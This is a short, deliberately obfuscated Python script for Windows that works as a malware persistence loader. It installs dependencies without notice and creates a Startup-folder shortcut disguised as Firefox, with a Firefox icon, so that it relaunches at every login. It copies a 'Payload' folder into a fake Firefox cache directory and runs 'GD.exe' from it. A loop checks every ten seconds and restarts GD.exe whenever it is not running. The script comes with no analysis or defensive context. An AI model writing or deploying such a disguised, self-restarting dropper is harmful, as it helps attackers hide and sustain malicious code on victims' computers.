import subprocess as G,os as A
from sys import executable as I
from time import sleep
for J in ['pywin32','psutil','shutil']:
	try:G.check_call([I,'-m','pip','install',J])
	except:pass
import psutil as K,shutil as B
from win32com.client import Dispatch as L
C='Firefox'
D=f"C:\\{C}\\Cache\\Disk Cache\\"
E='3.8.2023'
F=A.path.dirname(__file__)
H='GD.exe'
def M():D=f"{A.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{C}.lnk";E=__file__;G=L('WScript.Shell');B=G.CreateShortCut(D);B.IconLocation=A.path.join(F,f"{C}.ico");B.Targetpath=E;B.WorkingDirectory=F;B.save()
def N():
	try:B.rmtree(A.path.join(D,E))
	except:pass
	B.copytree(A.path.join(F,'Payload'),A.path.join(D,E),copy_function=B.copy);G.Popen(A.path.join(D,E,H))
def O():return H in(A.name()for A in K.process_iter())
M()
while True:
	if not O():N()
	sleep(10)